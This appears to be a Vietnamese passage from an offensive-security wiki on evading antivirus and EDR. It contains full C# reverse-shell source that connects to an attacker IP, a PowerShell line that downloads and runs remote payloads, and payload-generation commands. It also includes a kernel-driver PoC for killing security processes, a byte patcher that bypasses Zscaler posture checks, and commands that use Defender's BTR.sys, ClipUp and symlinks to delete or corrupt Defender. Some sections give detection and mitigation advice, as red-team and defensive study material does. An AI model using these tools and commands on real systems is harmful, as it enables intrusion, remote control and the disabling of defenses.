**CẢNH BÁO:** Để duy trì stealth, bạn không được làm một số việc sau:

- Đừng khởi chạy `winvnc` nếu nó đã chạy, nếu không bạn sẽ kích hoạt một [popup](https://i.imgur.com/1SROTTl.png). Kiểm tra xem nó có đang chạy hay không bằng `tasklist | findstr winvnc`
- Đừng khởi chạy `winvnc` khi không có `UltraVNC.ini` trong cùng thư mục, nếu không [cửa sổ cấu hình](https://i.imgur.com/rfMQWcf.png) sẽ mở
- Đừng chạy `winvnc -h` để xem trợ giúp, nếu không bạn sẽ kích hoạt một [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Tải xuống từ: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Bên trong GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Bây giờ **khởi động lister** bằng `msfconsole -r file.rc` và **thực thi** **xml payload** bằng:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Defender hiện tại sẽ nhanh chóng chấm dứt tiến trình.**

### Biên dịch reverse shell của riêng chúng ta

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell C# đầu tiên

Biên dịch bằng:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Sử dụng nó với:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# sử dụng trình biên dịch

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Tự động tải xuống và thực thi:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Danh sách C# obfuscator: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Ví dụ sử dụng python để build injector:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Các công cụ khác

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Thêm

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Diệt AV/EDR từ Kernel Space

Storm-2603 đã sử dụng một tiện ích console nhỏ có tên **Antivirus Terminator** để vô hiệu hóa các biện pháp bảo vệ endpoint trước khi thả ransomware. Công cụ này mang theo **driver dễ bị tấn công nhưng *được ký*** của riêng nó và lạm dụng driver đó để thực hiện các thao tác kernel có đặc quyền mà ngay cả các dịch vụ AV Protected-Process-Light (PPL) cũng không thể chặn.<sup>[[12]](#references)</sup>

Điểm chính
1. **Driver được ký**: Tệp được ghi vào đĩa là `ServiceMouse.sys`, nhưng binary thực chất là driver `AToolsKrnl64.sys` được ký hợp lệ của bộ “System In-Depth Analysis Toolkit” từ Antiy Labs. Vì driver có chữ ký Microsoft hợp lệ nên nó vẫn được tải ngay cả khi Driver-Signature-Enforcement (DSE) được bật.
2. **Cài đặt service**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Dòng đầu tiên đăng ký driver dưới dạng **kernel service**, còn dòng thứ hai khởi chạy nó để `\\.\ServiceMouse` có thể được truy cập từ userland.
3. **Các IOCTL do driver cung cấp**
   | Mã IOCTL | Khả năng                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Chấm dứt một tiến trình bất kỳ theo PID (dùng để kill các dịch vụ Defender/EDR) |
   | `0x990000D0` | Xóa một file bất kỳ trên ổ đĩa |
   | `0x990001D0` | Gỡ driver và xóa service |

   PoC C tối giản:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Tại sao cách này hiệu quả**: BYOVD bỏ qua hoàn toàn các cơ chế bảo vệ ở user-mode; mã chạy trong kernel có thể mở các tiến trình *được bảo vệ*, chấm dứt chúng hoặc can thiệp vào các đối tượng kernel bất kể PPL/PP, ELAM hay các tính năng hardening khác.

Phát hiện / Giảm thiểu
•  Bật danh sách chặn driver dễ bị tấn công của Microsoft (`HVCI`, `Smart App Control`) để Windows từ chối tải `AToolsKrnl64.sys`.
•  Theo dõi việc tạo các dịch vụ *kernel* mới và cảnh báo khi driver được tải từ thư mục có quyền ghi cho mọi người hoặc không có trong allow-list.
•  Theo dõi các handle ở user-mode trỏ đến device object tùy chỉnh, sau đó là các lệnh gọi `DeviceIoControl` đáng ngờ.

### Vượt qua kiểm tra Posture của Zscaler Client Connector bằng cách vá Binary trên Đĩa

**Client Connector** của Zscaler áp dụng các quy tắc device-posture trên máy cục bộ và dựa vào Windows RPC để truyền kết quả đến các thành phần khác. Hai lựa chọn thiết kế yếu khiến việc bypass hoàn toàn trở nên khả thi:

1. Đánh giá posture diễn ra **hoàn toàn ở phía client** (một giá trị boolean được gửi đến server).
2. Các endpoint RPC nội bộ chỉ xác thực rằng executable kết nối **được Zscaler ký** (thông qua `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Bằng cách **vá bốn binary đã ký trên đĩa**, cả hai cơ chế đều có thể bị vô hiệu hóa:

| Binary | Logic gốc được vá | Kết quả |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Luôn trả về `1` nên mọi lần kiểm tra đều đạt |
| `ZSAService.exe` | Lệnh gọi gián tiếp đến `WinVerifyTrust` | Bị thay bằng NOP ⇒ bất kỳ tiến trình nào (kể cả không được ký) cũng có thể kết nối với các RPC pipe |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Được thay bằng `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Các bước kiểm tra tính toàn vẹn của tunnel | Bị bỏ qua |

Trích đoạn patcher tối giản:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Sau khi thay thế các tệp gốc và khởi động lại service stack:

* **Tất cả** posture check đều hiển thị **xanh/đạt chuẩn**.
* Binary chưa ký hoặc đã bị chỉnh sửa có thể mở các RPC endpoint dạng named-pipe (ví dụ: `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host bị xâm nhập có quyền truy cập không hạn chế vào mạng nội bộ được xác định bởi các chính sách Zscaler.

Case study này cho thấy các quyết định tin cậy hoàn toàn ở phía client và những bước kiểm tra chữ ký đơn giản có thể bị vượt qua chỉ bằng một vài bản vá byte.

## Lạm dụng chức năng đáng tin cậy của Microsoft Defender `BTR.sys`

Driver **Boot-Time Removal** của Defender là một ví dụ đối lập hữu ích với BYOVD cổ điển. `BTR.sys` là một thành phần remediation hợp lệ do Microsoft ký, không có lỗi memory-corruption và không có giao diện IOCTL; thay vào đó, sau khi có quyền administrator và `SeLoadDriverPrivilege`, operator có thể giả mạo giao dịch remediation riêng của driver để thực hiện các thao tác tệp/registry Ring-0 theo đúng thiết kế. Đây là **primitive vô hiệu hóa AV/EDR sau khi bị xâm nhập, không phải truy cập ban đầu hay leo thang đặc quyền**, và có thể trích xuất driver từ resource `BOOTTIMETOOL` trong `MpEngine.dll` của chính mục tiêu thay vì đưa vào một driver bên thứ ba dễ gây chú ý.<sup>[[36]](#references)</sup>

### Staging driver dùng một lần

Defender thường ghi resource này thành một tệp `[a-z]{8}.sys` ngẫu nhiên và đăng ký một kernel service có tên tương tự. `DriverEntry` đọc giá trị `Args` của service, mở NTFS ADS được tham chiếu, giải mã và xác thực danh sách hành động, ghi phản hồi, rồi trả về `0xC0000056` (`STATUS_DELETE_PENDING`) sau khi thực thi thành công để driver được unload thay vì tiếp tục tồn tại trong bộ nhớ. Một service giả mạo có các giá trị đặc trưng sau đây.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Luồng `:changelist` chứa một blob được mã hóa bằng RC4. Các bản build được phân tích sử dụng lại một khóa cố định 256 byte, vì vậy mã hóa không phải là ranh giới phân quyền. Plaintext hợp lệ có header toàn cục dài 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC của header và transaction ID được tạo từ payload), theo sau là đường dẫn feedback UTF-16 kết thúc bằng ký tự null và bất kỳ số lượng item nào. Mỗi item có header dài 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) cùng dữ liệu đặc thù cho action, kết thúc bằng **chính xác bốn byte NUL**. Mỗi vùng header/data được kiểm tra độc lập bằng CRC-32 với polynomial `0xEDB88320`, trạng thái ban đầu `0xFFFFFFFF` và **không có phép XOR cuối** (`~CRC32`); trạng thái CRC được đặt lại cho mỗi vùng.<sup>[[36]](#references)[[37]](#references)</sup>

Các action ID được chấp nhận cho phép sử dụng những kernel primitive sau.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dữ liệu item | Kết quả |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Xóa file, kể cả file đang bị khóa |
| 2 | `[UTF-16 path]` | Xóa thư mục trống |
| 3 | `[Flags][source][destination]` | Di chuyển file vào protected path do attacker chọn; destination rỗng có nghĩa là xóa |
| 4 | `[Flags][key path]` | Xóa đệ quy registry key |
| 5 | `[Flags][key path + "\\" + value]` | Xóa registry value |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Tạo/cập nhật registry value và tạo các key path còn thiếu |

Với action 5 và 6, dấu phân cách key/value trên wire là **hai dấu gạch chéo ngược liên tiếp**; path được định dạng theo quy ước sẽ không được tách đúng. File feedback phần lớn phản ánh request, nhưng bốn byte dữ liệu đầu tiên của mỗi item trở thành `NTSTATUS` tương ứng. Với action 1 và 2, vốn không có trường flags ở đầu, BTR dịch path vào bốn byte dành riêng ở cuối để dành chỗ cho status.<sup>[[36]](#references)</sup>

### Quy trình `BTR_CLI` và khoảng thời gian đầu boot

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) triển khai toàn bộ chuỗi: trích xuất `BTR.sys` từ Defender trên máy cục bộ, tạo `<random>.sys:changelist` cùng một feedback stream, tuần tự hóa/tính checksum/mã hóa các action được nối chuỗi, trực tiếp tạo service registry key, rồi gọi `NtLoadDriver` với `-trigger now` hoặc để driver chạy khi hệ thống khởi động bằng `-trigger boot`. Staging registry trực tiếp tránh luồng `CreateServiceW` thông thường của SCM, vì vậy **không tạo ra Event ID 7045 khi cài service**. Có thể xóa các artifact được kích hoạt khi boot sau đó bằng `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` không thể sử dụng vì BTR thực hiện I/O tệp từ `DriverEntry` trước khi storage stack và liên kết `SystemRoot` sẵn sàng. `Start=1` cùng với nhóm ưu tiên cao `Boot Bus Extender` sẽ thực thi trong Phase 1: NTFS đã khả dụng, nhưng nhiều security driver khởi động cùng hệ thống và dịch vụ EDR chạy ở user mode vẫn chưa khởi tạo. Các filter khởi động cùng hệ thống như `WdFilter` có thể đã được tải, nhưng BTR có thể xóa binary hoặc cấu hình service của chúng trước lần khởi động tiếp theo, đồng thời xóa executable của service trước khi SCM khởi chạy. ELAM không khép được lỗ hổng này vì BTR chạy sau bước đánh giá boot-start và có chữ ký Microsoft hợp lệ.<sup>[[36]](#references)</sup>

Nhiều action được thực thi trong một transaction. PoC thêm Action 1 vào đầu danh sách cho đường dẫn `\SystemRoot\Temp\BootClean.log` được hard-code: BTR tạo log này, sau đó xử lý yêu cầu xóa của chính nó và xóa log trước khi unload. Cách này giảm dấu vết, trong khi lưu feedback trong `<random>.sys:<random>.dat` cho phép xóa driver và cả hai stream cùng lúc.<sup>[[36]](#references)[[37]](#references)</sup>

### Các tương quan phát hiện có tín hiệu cao

Các rule chỉ dựa trên chữ ký và Microsoft vulnerable-driver blocklist không ngăn được việc lạm dụng chức năng BTR vốn hoạt động theo thiết kế. Ưu tiên các tương quan hành vi sau, đồng thời phân biệt lineage hợp lệ của Defender với một launcher tùy ý.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Việc tạo `.sys:changelist` là đặc điểm phổ biến trong quá trình staging BTR. ADS `.dat` gắn với cùng `.sys` đặc biệt đáng ngờ vì Defender hợp lệ thường lưu feedback bên dưới `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 không có System 7045:** Tương quan việc tạo trực tiếp `HKLM\SYSTEM\CurrentControlSet\Services\<random>` có chứa `Args=...:changelist` và `Group=Boot Bus Extender` nhưng không có sự kiện cài đặt SCM tương ứng.
- **Sysmon 6 -> 23:** Tương quan việc tải một driver BTR đã biết từ lineage không thuộc Defender với sự kiện xóa tệp tiếp theo do `System`/PID 4 thực hiện, đặc biệt nếu tệp thuộc về các binary bảo mật.
- **Sysmon 11 -> 23:** Cảnh báo khi `\SystemRoot\Temp\BootClean.log` được tạo rồi xóa nhanh chóng bởi `System`/PID 4.
- Hạn chế và kiểm tra việc cấp/bật `SeLoadDriverPrivilege`; chỉ riêng chữ ký Microsoft không đủ để xác nhận độ tin cậy khi driver của công cụ bảo mật được staging bởi `cmd.exe`, PowerShell hoặc một process không xác định.

## Lạm dụng Protected Process Light (PPL) để can thiệp AV/EDR bằng LOLBINs

Protected Process Light (PPL) áp dụng hệ thống phân cấp signer/level, theo đó chỉ các protected process có cấp độ ngang bằng hoặc cao hơn mới có thể can thiệp lẫn nhau. Về mặt tấn công, nếu có thể khởi chạy hợp lệ một binary hỗ trợ PPL và kiểm soát các đối số của nó, bạn có thể biến chức năng vô hại (ví dụ: ghi log) thành primitive ghi bị giới hạn, được PPL bảo vệ, nhắm vào các thư mục được AV/EDR bảo vệ.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Điều kiện để một process chạy dưới dạng PPL
- EXE mục tiêu (và mọi DLL được tải) phải được ký bằng EKU hỗ trợ PPL.
- Process phải được tạo bằng CreateProcess với các flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Phải yêu cầu protection level tương thích với signer của binary (ví dụ: `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` cho signer anti-malware, `PROTECTION_LEVEL_WINDOWS` cho signer Windows). Yêu cầu sai level sẽ khiến việc tạo process thất bại.

Xem thêm phần giới thiệu tổng quan về PP/PPL và bảo vệ LSASS tại đây:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Công cụ launcher
- Helper mã nguồn mở: CreateProcessAsPPL (chọn protection level và chuyển tiếp các đối số đến EXE mục tiêu):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Cách sử dụng:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Primitive LOLBIN: ClipUp.exe
- Binary hệ thống đã ký `C:\Windows\System32\ClipUp.exe` tự khởi chạy một tiến trình con và chấp nhận tham số để ghi tệp log vào đường dẫn do caller chỉ định.
- Khi được chạy dưới dạng tiến trình PPL, thao tác ghi tệp được thực hiện với PPL backing.
- ClipUp không phân tích được đường dẫn có chứa dấu cách; hãy dùng đường dẫn ngắn 8.3 để trỏ đến các vị trí thường được bảo vệ.

Trợ giúp về đường dẫn ngắn 8.3
- Liệt kê tên ngắn: chạy `dir /x` trong từng thư mục cha.
- Tạo đường dẫn ngắn trong cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Chuỗi lạm dụng (khái quát)
1) Khởi chạy LOLBIN có khả năng chạy dưới dạng PPL (ClipUp) bằng `CREATE_PROTECTED_PROCESS` thông qua một launcher (ví dụ: CreateProcessAsPPL).
2) Truyền tham số đường dẫn log cho ClipUp để buộc tạo tệp trong thư mục AV được bảo vệ (ví dụ: Defender Platform). Nếu cần, hãy dùng tên ngắn 8.3.
3) Nếu AV thường mở/khóa binary mục tiêu khi đang chạy (ví dụ: MsMpEng.exe), hãy lên lịch ghi tệp lúc khởi động trước khi AV bắt đầu chạy bằng cách cài đặt một service tự khởi động và đảm bảo service chạy sớm hơn. Xác minh thứ tự khởi động bằng Process Monitor (boot logging).
4) Khi khởi động lại, thao tác ghi được PPL backing sẽ diễn ra trước khi AV khóa các binary của nó, làm hỏng tệp mục tiêu và ngăn AV khởi động.

Lệnh gọi ví dụ (đường dẫn đã được lược bỏ/rút gọn để an toàn):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Ghi chú và giới hạn
- Bạn không thể kiểm soát nội dung mà ClipUp ghi ngoài vị trí ghi; primitive này phù hợp để gây hỏng dữ liệu hơn là chèn nội dung chính xác.
- Cần quyền local admin/SYSTEM để cài đặt/khởi động service và cần có khoảng thời gian reboot.
- Thời điểm rất quan trọng: target không được mở; thực thi lúc khởi động giúp tránh file lock.

Phát hiện
- Tạo process `ClipUp.exe` với các argument bất thường, đặc biệt khi được khởi chạy bởi launcher không tiêu chuẩn vào khoảng thời gian boot.
- Các service mới được cấu hình để tự khởi động binary đáng ngờ và luôn khởi động trước Defender/AV. Điều tra việc tạo/chỉnh sửa service trước các lỗi khởi động Defender.
- Giám sát tính toàn vẹn file của binary/thư mục Platform của Defender; phát hiện file được tạo/chỉnh sửa bất thường bởi process có cờ protected-process.
- Telemetry ETW/EDR: tìm process được tạo với `CREATE_PROTECTED_PROCESS` và việc binary không phải AV sử dụng PPL level bất thường.

Biện pháp giảm thiểu
- WDAC/Code Integrity: giới hạn các binary đã ký nào được phép chạy dưới dạng PPL và dưới parent nào; chặn gọi ClipUp ngoài ngữ cảnh hợp lệ.
- Vệ sinh service: hạn chế việc tạo/chỉnh sửa service tự khởi động và giám sát thao túng thứ tự khởi động.
- Đảm bảo đã bật tamper protection của Defender và các biện pháp bảo vệ early-launch; điều tra lỗi khởi động cho thấy binary bị hỏng.
- Cân nhắc tắt tạo tên ngắn 8.3 trên các volume lưu công cụ bảo mật nếu phù hợp với môi trường của bạn (kiểm tra kỹ).

## Can thiệp Microsoft Defender bằng cách chiếm quyền qua symlink thư mục phiên bản Platform

Windows Defender chọn platform để chạy bằng cách liệt kê các thư mục con trong:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Defender chọn thư mục con có chuỗi phiên bản theo thứ tự từ điển cao nhất (ví dụ: `4.18.25070.5-0`), sau đó khởi chạy các process service của Defender từ đó (đồng thời cập nhật các đường dẫn service/registry). Cơ chế lựa chọn này tin cậy các mục thư mục, bao gồm cả directory reparse point (symlink). Administrator có thể lợi dụng điều này để chuyển hướng Defender đến một đường dẫn attacker có thể ghi, từ đó thực hiện DLL sideloading hoặc làm gián đoạn service.<sup>[[21]](#references)[[22]](#references)</sup>

Điều kiện tiên quyết
- Local Administrator (cần để tạo thư mục/symlink trong thư mục Platform)
- Có thể reboot hoặc kích hoạt Defender chọn lại platform (khởi động lại service khi boot)
- Chỉ cần các công cụ có sẵn trong hệ thống (mklink)

Vì sao cách này hiệu quả
- Defender chặn việc ghi vào các thư mục của chính nó, nhưng cơ chế chọn platform tin cậy các mục thư mục và chọn phiên bản cao nhất theo thứ tự từ điển mà không xác thực rằng đích trỏ đến đường dẫn được bảo vệ/đáng tin cậy.

Từng bước (ví dụ)
1) Chuẩn bị một bản sao có thể ghi của thư mục platform hiện tại, ví dụ: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Tạo một symlink thư mục phiên bản cao hơn bên trong Platform, trỏ đến thư mục của bạn:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Lựa chọn Trigger (khuyến nghị khởi động lại):
```cmd
shutdown /r /t 0
```
4) Xác minh MsMpEng.exe (WinDefend) chạy từ đường dẫn được chuyển hướng:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Bạn nên thấy đường dẫn tiến trình mới nằm dưới `C:\TMP\AV\` và cấu hình service/registry phản ánh vị trí đó.

Các tùy chọn hậu khai thác
- DLL sideloading/code execution: Thả/thay thế các DLL mà Defender tải từ thư mục ứng dụng của nó để thực thi code trong các tiến trình của Defender. Xem phần phía trên: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Xóa version-symlink để khi khởi động lần tiếp theo, đường dẫn đã cấu hình không được phân giải và Defender không thể khởi động:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Lưu ý rằng bản thân kỹ thuật này không giúp leo thang đặc quyền; kỹ thuật này yêu cầu quyền admin.

## API/IAT Hooking + Call-Stack Spoofing với PIC (kiểu Crystal Kit)

Red Team có thể chuyển kỹ thuật né tránh khi chạy từ C2 implant sang chính module mục tiêu bằng cách hook Import Address Table (IAT) của module đó và định tuyến các API được chọn qua mã position-independent (PIC) do kẻ tấn công kiểm soát. Cách này mở rộng kỹ thuật né tránh vượt ra ngoài phạm vi API nhỏ mà nhiều kit cung cấp (ví dụ: CreateProcessA), đồng thời áp dụng cùng các biện pháp bảo vệ cho BOF và DLL hậu khai thác.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Cách tiếp cận tổng quan
- Stage một khối PIC cùng với module mục tiêu bằng reflective loader (đặt trước hoặc đi kèm). PIC phải độc lập và position-independent.
- Khi host DLL được tải, duyệt IMAGE_IMPORT_DESCRIPTOR của nó và vá các mục IAT tương ứng với những import mục tiêu (ví dụ: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) để trỏ tới các wrapper PIC mỏng.
- Mỗi wrapper PIC thực hiện các kỹ thuật né tránh trước khi tail-call đến địa chỉ API thật. Các kỹ thuật né tránh thường dùng gồm:
  - Mask/unmask bộ nhớ quanh lời gọi (ví dụ: mã hóa vùng beacon, chuyển RWX→RX, đổi tên/permission của trang bộ nhớ), rồi khôi phục sau lời gọi.
  - Call-stack spoofing: tạo một stack có vẻ lành tính rồi chuyển sang API mục tiêu để phân tích call stack cho ra các frame như mong đợi.<sup>[[9]](#references)</sup>
- Để tương thích, export một interface để script Aggressor (hoặc công cụ tương đương) có thể đăng ký các API cần hook cho Beacon, BOF và DLL hậu khai thác.

Lý do dùng IAT hooking trong trường hợp này
- Hoạt động với mọi mã sử dụng import đã hook, không cần sửa mã công cụ hoặc phụ thuộc vào Beacon để proxy các API cụ thể.
- Bao phủ cả DLL hậu khai thác: hook LoadLibrary* cho phép chặn việc tải module (ví dụ: System.Management.Automation.dll, clr.dll) và áp dụng cùng kỹ thuật masking/né tránh stack cho các lời gọi API của chúng.
